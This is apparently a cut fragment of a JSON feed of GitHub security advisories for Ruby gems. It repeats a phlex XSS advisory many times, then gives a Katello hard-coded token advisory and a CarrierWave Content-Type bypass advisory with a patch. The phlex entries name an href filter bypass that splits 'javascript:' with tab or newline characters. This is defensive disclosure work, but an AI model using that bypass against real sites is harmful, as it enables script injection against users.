href=\"https://rubygems.org/gems/phlex/versions/1.6.3\">1.6.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.5.3\">1.5.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.4.2\">1.4.2</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb\">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32463\">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c",
            "title": "[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags",
            "date_modified": "2024-04-19T21:44:04.000Z",
            "date_published": "2024-04-17T00:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\\t</code> or newline <code>\\n</code> characters between the characters of the protocol, e.g. <code>java\\tscript:</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.1\">1.10.1</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.2\">1.9.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.8.3\">1.8.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.7.2\">1.7.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.6.3\">1.6.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.5.3\">1.5.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.4.2\">1.4.2</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb\">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32463\">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c",
            "title": "[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags",
            "date_modified": "2024-04-19T21:44:04.000Z",
            "date_published": "2024-04-17T00:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\\t</code> or newline <code>\\n</code> characters between the characters of the protocol, e.g. <code>java\\tscript:</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.1\">1.10.1</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.2\">1.9.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.8.3\">1.8.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.7.2\">1.7.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.6.3\">1.6.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.5.3\">1.5.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.4.2\">1.4.2</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb\">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32463\">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c",
            "title": "[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags",
            "date_modified": "2024-04-19T21:44:04.000Z",
            "date_published": "2024-04-17T00:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\\t</code> or newline <code>\\n</code> characters between the characters of the protocol, e.g. <code>java\\tscript:</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.1\">1.10.1</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.2\">1.9.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.8.3\">1.8.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.7.2\">1.7.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.6.3\">1.6.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.5.3\">1.5.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.4.2\">1.4.2</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb\">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32463\">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c",
            "title": "[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags",
            "date_modified": "2024-04-19T21:44:04.000Z",
            "date_published": "2024-04-17T00:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\\t</code> or newline <code>\\n</code> characters between the characters of the protocol, e.g. <code>java\\tscript:</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.1\">1.10.1</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.2\">1.9.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.8.3\">1.8.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.7.2\">1.7.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.6.3\">1.6.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.5.3\">1.5.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.4.2\">1.4.2</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb\">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32463\">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c",
            "title": "[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags",
            "date_modified": "2024-04-19T21:44:04.000Z",
            "date_published": "2024-04-17T00:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\\t</code> or newline <code>\\n</code> characters between the characters of the protocol, e.g. <code>java\\tscript:</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.1\">1.10.1</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.2\">1.9.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.8.3\">1.8.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.7.2\">1.7.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.6.3\">1.6.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.5.3\">1.5.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.4.2\">1.4.2</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb\">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32463\">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c",
            "title": "[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags",
            "date_modified": "2024-04-19T21:44:04.000Z",
            "date_published": "2024-04-17T00:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\\t</code> or newline <code>\\n</code> characters between the characters of the protocol, e.g. <code>java\\tscript:</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.1\">1.10.1</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.2\">1.9.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.8.3\">1.8.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.7.2\">1.7.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.6.3\">1.6.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.5.3\">1.5.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.4.2\">1.4.2</a></li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb\">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32463\">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7xq-xv8c-h98c\">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c",
            "title": "[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags",
            "date_modified": "2024-04-19T21:44:04.000Z",
            "date_published": "2024-04-17T00:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7xq-xv8c-h98c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The installation script in Katello 1.0 and earlier does not properly generate the <code>Application.config.secret_token</code> value, which causes each default installation to have the same secret token, and allows remote attackers to authenticate to the CloudForms System Engine web interface as an arbitrary user by creating a cookie using the default <code>secret_token</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3503\">https://nvd.nist.gov/vuln/detail/CVE-2012-3503</a></li>\n<li><a href=\"https://github.com/Katello/katello/pull/499\">https://github.com/Katello/katello/pull/499</a></li>\n<li><a href=\"https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3\">https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2012-1186.html\">http://rhn.redhat.com/errata/RHSA-2012-1186.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2012-1187.html\">http://rhn.redhat.com/errata/RHSA-2012-1187.html</a></li>\n<li><a href=\"https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344\">https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344</a></li>\n<li><a href=\"https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140\">https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5xv2-q475-rwrh\">https://github.com/advisories/GHSA-5xv2-q475-rwrh</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5xv2-q475-rwrh",
            "title": "[katello] Katello uses hard coded credential",
            "date_modified": "2024-04-12T18:08:37.000Z",
            "date_published": "2022-05-17T05:13:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5xv2-q475-rwrh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The installation script in Katello 1.0 and earlier does not properly generate the <code>Application.config.secret_token</code> value, which causes each default installation to have the same secret token, and allows remote attackers to authenticate to the CloudForms System Engine web interface as an arbitrary user by creating a cookie using the default <code>secret_token</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3503\">https://nvd.nist.gov/vuln/detail/CVE-2012-3503</a></li>\n<li><a href=\"https://github.com/Katello/katello/pull/499\">https://github.com/Katello/katello/pull/499</a></li>\n<li><a href=\"https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3\">https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2012-1186.html\">http://rhn.redhat.com/errata/RHSA-2012-1186.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2012-1187.html\">http://rhn.redhat.com/errata/RHSA-2012-1187.html</a></li>\n<li><a href=\"https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344\">https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344</a></li>\n<li><a href=\"https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140\">https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5xv2-q475-rwrh\">https://github.com/advisories/GHSA-5xv2-q475-rwrh</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5xv2-q475-rwrh",
            "title": "[katello] Katello uses hard coded credential",
            "date_modified": "2024-04-12T18:08:37.000Z",
            "date_published": "2022-05-17T05:13:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5xv2-q475-rwrh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability <a href=\"https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-gxhx-g4fq-49hj\">CVE-2023-49090</a> wasn't fully addressed.</p>\n<p>This vulnerability is caused by the fact that when uploading to object storage, including Amazon S3, it is possible to set a Content-Type value that is interpreted by browsers to be different from what's allowed by <code>content_type_allowlist</code>, by providing multiple values separated by commas.</p>\n<p>This bypassed value can be used to cause XSS.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to <a href=\"https://rubygems.org/gems/carrierwave/versions/3.0.7\">3.0.7</a> or <a href=\"https://rubygems.org/gems/carrierwave/versions/2.2.6\">2.2.6</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use the following monkey patch to let CarrierWave parse the Content-type by using <code>Marcel::MimeType.for</code>.</p>\n<pre><code class=\"language-ruby\"># For CarrierWave 3.x\nCarrierWave::SanitizedFile.class_eval do\n  def declared_content_type\n    @declared_content_type ||\n      if @file.respond_to?(:content_type) &amp;&amp; @file.content_type\n        Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)\n      end\n  end\nend\n</code></pre>\n<pre><code class=\"language-ruby\"># For 